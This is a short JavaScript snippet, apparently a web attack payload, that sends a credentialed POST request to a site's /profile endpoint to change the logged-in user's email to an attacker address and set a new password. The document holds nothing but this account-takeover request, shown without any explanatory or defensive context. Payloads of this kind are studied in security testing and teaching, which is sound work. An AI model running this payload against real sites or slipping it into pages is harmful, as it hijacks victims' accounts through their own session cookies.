fetch("/profile", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  credentials: "include",
  body: "email=attacker@evil.example&password=pwned-123"
});
